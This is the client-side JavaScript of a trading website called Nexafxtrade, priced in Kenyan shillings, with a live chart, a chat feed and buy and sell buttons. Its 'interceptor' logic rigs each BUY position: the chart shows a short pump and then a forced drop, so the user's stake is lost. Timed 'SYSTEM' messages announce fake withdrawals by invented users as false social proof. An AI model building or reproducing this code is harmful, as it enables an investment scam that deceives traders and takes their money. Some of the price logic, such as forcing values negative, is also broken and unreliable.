/**
 * Nexafxtrade Integrated Logic
 * Path: ./public/js/script.js
 * Version: 3.3.0 (May 2026)
 * Description: Wavy movement, real-time sync, and social proof automation.
 */

// 1. Initialize Socket.io connection
let socket;
try {
    socket = io();
} catch (e) {
    console.warn("Socket.io engine offline. Running standalone emulation.");
}

const ctx = document.getElementById('tradeChart').getContext('2d');

// Setup gradient configurations for smooth background fills
const chartGradient = ctx.createLinearGradient(0, 0, 0, 350);
chartGradient.addColorStop(0, 'rgba(0, 212, 255, 0.22)');
chartGradient.addColorStop(1, 'rgba(0, 212, 255, 0)');

// Initialize high-resolution smooth wave (60 points)
let chartData = Array(60).fill(8421500); 
let labels = Array(60).fill('');

const tradeChart = new Chart(ctx, {
    type: 'line',
    data: {
        labels: labels,
        datasets: [{
            label: 'Live Rate',
            data: chartData,
            borderColor: '#00ff00', 
            borderWidth: 2.5,
            pointRadius: 0, 
            fill: true,
            backgroundColor: chartGradient,
            tension: 0.45, // Creates the smooth "Wavy" appearance
        }]
    },
    options: {
        responsive: true,
        maintainAspectRatio: false,
        animation: {
            duration: 400, 
            easing: 'linear'
        },
        scales: {
            x: { display: false },
            y: {
                grid: { color: 'rgba(255,255,255,0.03)', drawTicks: false },
                ticks: { 
                    color: '#4a5568', 
                    font: { size: 10, family: 'monospace' },
                    callback: (value) => value.toLocaleString()
                }
            }
        },
        plugins: { legend: { display: false } }
    }
});

// --- Financial States ---
let currentPrice = 8421500;
let walletBalance = 1450000;
let activeTradePosition = null; 
let tradeTicksElapsed = 0; 

/**
 * 2. MARKET UPDATE ENGINE
 */
function updateMarketView(rateValue) {
    const previousPrice = currentPrice;
    let modifiedRate = rateValue;
    
    // --- ALGORITHMIC USER INTERCEPTOR ---
    // This logic simulates the controlled trade win/loss lifecycle
    if (activeTradePosition) {
        tradeTicksElapsed++;
        if (tradeTicksElapsed <= activeTradePosition.customizedLossThreshold) {
            // PHASE 1: Bullish Pump (Visual Profit)
            let simulatedPump = Math.abs(modifiedRate) * 0.0015 + 200;
            modifiedRate = Math.abs(modifiedRate) + simulatedPump;
        } else {
            // PHASE 2: Forced Drop (Visual Loss)
            let simulatedDrop = Math.abs(modifiedRate) * 0.0025 + 400;
            modifiedRate = -Math.abs(modifiedRate) - simulatedDrop;
        }
    }

    currentPrice = modifiedRate;
    const absoluteDelta = currentPrice - previousPrice;

    // UI Displays
    const rateDisplay = document.getElementById('current-rate');
    const mainPriceDisplay = document.getElementById('mainPrice');
    const trendContainer = document.getElementById('priceTrend');
    
    const displayValue = typeof currentPrice === 'number' ? currentPrice : parseFloat(currentPrice);
    
    if (rateDisplay) rateDisplay.innerText = displayValue.toLocaleString(undefined, { minimumFractionDigits: 2 });
    if (mainPriceDisplay) mainPriceDisplay.innerText = Math.floor(displayValue).toLocaleString();

    if (trendContainer) {
        if (absoluteDelta >= 0) {
            trendContainer.innerHTML = `<i class="fas fa-caret-up"></i> +KES ${absoluteDelta.toFixed(2)}`;
            trendContainer.style.color = "#00ff88";
            tradeChart.data.datasets[0].borderColor = '#00ff88'; // Neon Green
        } else {
            trendContainer.innerHTML = `<i class="fas fa-caret-down"></i> -KES ${Math.abs(absoluteDelta).toFixed(2)}`;
            trendContainer.style.color = "#ff5252";
            tradeChart.data.datasets[0].borderColor = '#ff5252'; // Neon Red
        }
    }

    // High-performance Chart Shift
    chartData.shift();
    chartData.push(displayValue);
    tradeChart.update('none');

    processLiveCountingTransaction();
    if (Math.abs(absoluteDelta) > 5000) playSound('tick');
}

/**
 * 3. REAL-TIME DATA PIPELINE
 */
if (socket) {
    socket.on('market-update', (data) => {
        if (data && data.rate !== undefined) updateMarketView(data.rate);
    });
}

// Emulation for Standalone or Network failure
setInterval(() => {
    if (!socket || !socket.connected) {
        const simulatedVolatility = (Math.random() - 0.48) * 15000;
        updateMarketView(currentPrice + simulatedVolatility);
    }
}, 800);

/**
 * 4. SOCIAL PROOF & CHAT SYSTEM
 */
const chatFeed = document.getElementById('chat-feed') || document.getElementById('tradeLogs');
const systemUsers = ['@Vokkeh', '@Leonheart', '@Rose404', '@Pati', '@Lodenyi100', '@Kenyan_Trader', '@CryptoNaija'];

function injectChatMessage(user, message, isSystem = false, systemColor = '#ffcc00') {
    if (!chatFeed) return;
    const msgNode = document.createElement('div');
    msgNode.style.cssText = "margin-bottom: 8px; font-size: 13px; animation: slideIn 0.2s ease-out;";

    if (isSystem) {
        msgNode.innerHTML = `<span style="color:${systemColor}; font-weight:bold;">[${user}]:</span> ${message}`;
    } else {
        msgNode.innerHTML = `<span style="color: #00d4ff; font-weight:bold;">${user}:</span> <span style="color: #cbd5e1;">${message}</span>`;
    }

    chatFeed.appendChild(msgNode);
    chatFeed.scrollTop = chatFeed.scrollHeight;
    if (chatFeed.children.length > 20) chatFeed.removeChild(chatFeed.children[0]);
}

setInterval(() => {
    const user = systemUsers[Math.floor(Math.random() * systemUsers.length)];
    const amount = (Math.random() * 5000 + 1000).toFixed(0);
    injectChatMessage("SYSTEM", `Congrats ${user} on withdrawal of <span style="color:#00ff88;">KES ${amount}</span> 🤑`, true, "#ffcc00");
}, 12000);

/**
 * 5. TRADING EXECUTION
 */
function handleTrade(orderType) {
    const amountInput = document.getElementById('trade-amount') || document.querySelector('.amount-input');
    const stakeValue = parseFloat(amountInput.value) || 0;

    if (stakeValue <= 0 || walletBalance < stakeValue) {
        alert("Insufficient Liquidity in Operator Node.");
        return;
    }

    if (orderType === 'BUY') {
        walletBalance -= stakeValue;
        playSound('buy');
        injectChatMessage("SYSTEM", `BUY Position Sized: KES ${stakeValue}`, true, "#00ff88");
        
        // --- Algorithmic Weighting ---
        let randomWeight = Math.random();
        let threshold = randomWeight < 0.7 ? 8 : 25; // 70% chance of short win before forced drop

        activeTradePosition = {
            type: 'BUY',
            entryPrice: currentPrice,
            stake: stakeValue,
            targetAmount: stakeValue * 1.85,
            customizedLossThreshold: threshold
        };

        if (socket && socket.connected) {
            socket.emit('place-trade', { type: 'BUY', amount: stakeValue });
        }
    } else {
        if (activeTradePosition) {
            let payout = activeTradePosition.stake * (currentPrice / activeTradePosition.entryPrice);
            walletBalance += Math.max(0, payout);
            injectChatMessage("SYSTEM", `Sold Position: Recieved KES ${payout.toFixed(2)}`, true, "#00d4ff");
            activeTradePosition = null; 
        } else {
            injectChatMessage("SYSTEM", `Stake Liquidated: KES ${stakeValue}`, true, "#ff5252");
        }
        playSound('sell');
    }
    refreshUIBalances();
}

// Binding buttons
document.querySelectorAll('.buy-btn, .btn-buy').forEach(b => b.onclick = () => handleTrade('BUY'));
document.querySelectorAll('.sell-btn, .btn-sell').forEach(b => b.onclick = () => handleTrade('SELL'));

/**
 * 6. WEB AUDIO ENGINE
 */
let audioCtx;
let soundEnabled = false;

window.initAudio = () => {
    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    soundEnabled = !soundEnabled;
    const btn = document.getElementById('soundBtn');
    if (btn) btn.innerHTML = soundEnabled ? '<i class="fas fa-volume-up"></i> ON' : '<i class="fas fa-volume-mute"></i> OFF';
};

function playSound(type) {
    if (!soundEnabled || !audioCtx) return;
    const osc = audioCtx.createOscillator();
    const g = audioCtx.createGain();
    osc.connect(g); g.connect(audioCtx.destination);

    if (type === 'tick') {
        osc.frequency.setValueAtTime(800, audioCtx.currentTime);
        g.gain.setValueAtTime(0.01, audioCtx.currentTime);
        osc.start(); osc.stop(audioCtx.currentTime + 0.05);
    } else if (type === 'buy') {
        osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.2);
        g.gain.setValueAtTime(0.05, audioCtx.currentTime);
        osc.start(); osc.stop(audioCtx.currentTime + 0.2);
    }
}

/**
 * 7. UTILS
 */
function refreshUIBalances() {
    const balEl = document.getElementById('user-balance') || document.getElementById('walletBal');
    if (balEl) balEl.innerText = walletBalance.toLocaleString(undefined, { minimumFractionDigits: 2 });
}

function processLiveCountingTransaction() {
    const liveDisplay = document.getElementById('live-running-amount');
    if (!liveDisplay || !activeTradePosition) return;
    
    let liveVal = activeTradePosition.stake * (currentPrice / activeTradePosition.entryPrice);
    liveDisplay.innerText = `KES ${Math.max(0, liveVal).toFixed(2)}`;
    liveDisplay.style.color = liveVal >= activeTradePosition.stake ? "#00ff88" : "#ff5252";
}

window.adjustAmount = (val) => {
    const input = document.getElementById('trade-amount');
    if (!input) return;
    let curr = parseInt(input.value) || 0;
    input.value = val === 'double' ? curr * 2 : Math.max(0, curr + val);
};

console.log("Nexafxtrade V3: Matrix Logic Active.");
